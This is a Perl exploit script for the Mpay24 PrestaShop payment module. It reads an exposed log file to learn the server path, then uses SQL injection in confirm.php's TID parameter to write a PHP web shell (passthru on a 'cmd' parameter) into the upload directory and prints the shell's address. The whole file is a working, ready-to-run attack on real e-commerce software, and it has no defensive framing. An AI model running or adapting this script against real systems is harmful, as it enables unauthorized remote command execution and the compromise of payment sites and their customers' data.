#!/usr/bin/perl
#
#Mpay24 prestashop payment module RCE via blind SQLi
# Written by @Wireghoul - http://www.justanotherhacker.com
#
# Not for the dough
# Just for the love
# This is what we do
# - Multicyde

use LWP::Simple;

if (!$ARGV[0]) {
    print "Usage: $0 http://target/[path]\n";
    exit 2;
}

# Lets find the local file path first
my $fp = get($ARGV[0]."/modules/mpay24/api/curllog.log");
my $path;
if (!$fp) {
    print "Unable to fetch $ARGV[0]/modules/mpay24/api/curllog.log, check your target\n";
    exit 2;
} else {
    if ($fp =~ m!CAfile: (.*)modules/mpay24/api/cacert.pem!) {
        $path = $1;
        print "Identified path: $path\n";
    } else {
        print "Unable to locate path, specify path to try:\n";
        $path=<STDIN>;
    }
}

my @chars = ("A".."Z", "a".."z");
my $of = join '', map { $chars[rand scalar @chars] } 1..8;

# exploit
my $success = get("$ARGV[0]/modules/mpay24/confirm.php?MPAYTID=1&TID=pwnt';select \"<?php passthru(\$_GET['cmd']); ?>\"  into outfile '".$path."/upload/$of.php&STATUS=rce");
if (!$success) {
    print "ohnoes, something failed, bailing out\n";
    exit 2;
}
print "Shell deployed to $ARGV[0]/upload/$of.php?cmd=whoami\n";
